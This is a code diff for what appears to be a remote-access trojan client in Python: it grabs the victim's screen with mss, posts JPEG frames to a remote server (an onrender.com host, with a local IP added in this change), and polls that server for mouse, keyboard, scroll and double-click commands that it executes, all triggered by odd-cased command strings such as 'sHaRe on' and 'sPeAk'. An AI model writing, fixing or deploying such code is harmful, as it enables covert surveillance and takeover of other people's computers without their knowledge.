@@ -20,6 +20,7 @@ from pyautogui import size
 from mss import mss
 import pynput
 url = "https://ms32-sha2.onrender.com/"
+url = "http://192.168.9.115:5000/"
 screen = rs.get_primary_display()
 terminate = False
 sstate = False
@@ -303,12 +304,14 @@ def showerr(num):
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
 
-async def share():
+def share():
     global sharing
-    async with httpx.AsyncClient() as client:
-        with mss() as sct:
-            monitor = sct.monitors[1]
-            while sharing:
+    
+        # async with httpx.AsyncClient() as client:  
+    with mss() as sct:
+        monitor = sct.monitors[1]
+        while sharing:
+            try:
                 start_time = time.time()
                 ss = sct.grab(monitor)
                 img = Image.frombytes("RGB", 
@@ -319,48 +322,53 @@ async def share():
                 img.save(buffer,format="JPEG",quality=80)
                 buffer.seek(0)
                 # img = base64.b64encode(buffer.getvalue())
-                await client.post(url+"screenshot", data=buffer.read())
+                rq.post(url+"screenshot", data=buffer.read())
                 elapsed_time = time.time() - start_time
                 fps = 1 / elapsed_time if elapsed_time > 0 else 0
-                print(f"FPS: {fps:.2f}")
+                # print(f"FPS: {fps:.2f}")
                 fps_delay = max(0, 1/5 - elapsed_time)
-                await asyncio.sleep(fps_delay)
-def async_runner():
-    asyncio.run(share())
-async def control():
+                sleep(fps_delay)
+            except httpx.ConnectTimeout:continue
+
+def control():
     global sharing
-    controller = pynput.keyboard.Controller()
-    async with httpx.AsyncClient() as client:
-        while sharing:
-            data =  await client.get(url+"control")
+    
+        # controller = pynput.keyboard.Controller()
+        # async with httpx.AsyncClient() as client:
+    while sharing:
+        try:
+            data =  rq.get(url+"control")
             data = data.json()
+            print(data) if data else None
             if data and data["type"] == "mouse":
-# {'height': 853, 'mouse': 0, 'type': 'mouse', 'width': 1517, 'x': 1516, 'y': 852}
-                print(data)
+                # print(data)
                 x = data["x"]*(width/data["width"])
                 y = data["y"]*(height/data["height"])            
                 move(x,y)
                 if data["mouse"] == 0:
                     click()
-                elif data["mouse"] == 1:
+                elif data["mouse"] == 1:        
                     click(button="right")
                 elif data["mouse"] == 2:
                     click(button="middle")
-            elif data and data["type"] == "key":
-                #controller.press(chr(data["btn"]))
-                keyboard.send("+".join(chr(data["button"])))
-               
-            elif data and data["type"] == "scroll":
+            elif data and data["type"] == "key" and data["btn"]:
+                #{"btn":[17,65],"type":"key"}
+                btns = []
+                for key in data["btn"]:
+                    btns.append(chr(key)) if type(key) == int else btns.append(key)
+                keys = "+".join(btns)
+                print(keys)
+                keyboard.send(keys)
+            elif data and data["type"] == "scroll":                                    
                 wheel(delta=data["deltaY"])
-                
+
             elif data and data["type"] == "dbclick":
                 x = data["x"]*(width/data["width"])
                 y = data["y"]*(height/data["height"])            
                 move(x,y)
-                double_click()                           
-                
-def async_runner2():
-    asyncio.run(control())
+                double_click()
+        except httpx.ConnectTimeout:continue
+            
 def main():
     global sstate
     global sharing
@@ -414,8 +422,8 @@ def main():
                 Thread(target=showerr,args=(cmd,)).start()
             elif "sHaRe on" in cmd:
                 sharing = True
-                Thread(target=async_runner).start()
-                Thread(target=async_runner2).start()
+                Thread(target=share).start()
+                Thread(target=control).start()
             elif "sHaRe off" in cmd:
                 sharing = False
             elif "sPeAk" in cmd:
